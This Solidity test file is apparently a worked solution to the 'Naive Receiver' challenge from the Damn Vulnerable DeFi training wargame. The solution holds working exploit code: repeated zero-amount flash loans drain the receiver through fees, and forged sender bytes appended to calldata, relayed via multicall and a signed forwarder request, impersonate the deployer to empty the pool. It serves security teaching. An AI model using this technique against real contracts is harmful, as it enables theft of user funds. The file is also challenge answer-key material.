// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // First, recover funds from the FlashLoanReceiver
        bytes memory receiverDrainCalldata = abi.encodeWithSignature("flashLoan(address,address,uint256,bytes)", receiver, address(weth), 0, "");
        bytes[] memory multicallPayloadOne = new bytes[](10);
        for (uint8 i = 0; i < 10; i++) {
            multicallPayloadOne[i] = receiverDrainCalldata;
        }
        pool.multicall(multicallPayloadOne);

        // Then, drain the NaiveReceiverPool by using both the multicall and the forwarder
        // We first craft a call to withdraw, and add the address of the deployer at the end.
        // Since we are going through the multicall, we can send any arbitrary calldata, and since we go through
        // the forwarder, the msg.sender will be obtained from the last 20 bytes of the calldata.
        bytes memory poolDrainCallData = abi.encodePacked(abi.encodeWithSignature("withdraw(uint256,address)", pool.deposits(deployer), recovery), deployer);
        bytes[] memory multicallPayloadTwo = new bytes[](1);
        multicallPayloadTwo[0] = poolDrainCallData;
        bytes memory forwarderCallData = abi.encodeWithSignature("multicall(bytes[])", multicallPayloadTwo);

        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0,
            gasleft(),
            0,
            forwarderCallData,
            block.timestamp
        );

        // Signing the request
        bytes32 dataHash = keccak256(abi.encodePacked(
            hex"19_01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        ));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, dataHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Calling the Recovery contract
        forwarder.execute(request, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
